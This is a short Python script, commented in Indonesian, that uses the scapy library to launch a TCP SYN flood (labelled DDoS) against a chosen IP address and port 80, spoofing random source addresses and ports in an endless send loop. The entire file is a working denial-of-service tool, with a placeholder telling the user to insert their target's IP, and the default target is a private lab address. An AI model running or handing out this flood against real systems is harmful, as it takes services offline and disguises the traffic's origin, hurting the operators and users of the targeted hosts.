from scapy.all import IP, TCP, send, RandIP, RandShort
import time

# --- KONFIGURASI ---
target_ip = "192.168.0.111"  # GANTI DENGAN IP TARGET ANDA
target_port = 80             # Menyerang port Web Server
# -------------------

print(f"--- Memulai TCP SYN Flood (DDoS) ke {target_ip}:{target_port} ---")
print("Tekan Ctrl+C untuk berhenti.")

try:
    while True:
        # Membuat paket IP dengan Source IP acak (Spoofing)
        # Membuat paket TCP dengan Source Port acak dan Flag 'S' (SYN)
        packet = IP(src=RandIP(), dst=target_ip) / \
                 TCP(sport=RandShort(), dport=target_port, flags="S")

        # Kirim paket (verbose=0 biar terminal gak berisik)
        send(packet, verbose=0)

except KeyboardInterrupt:
    print("\n--- Serangan TCP dihentikan ---")
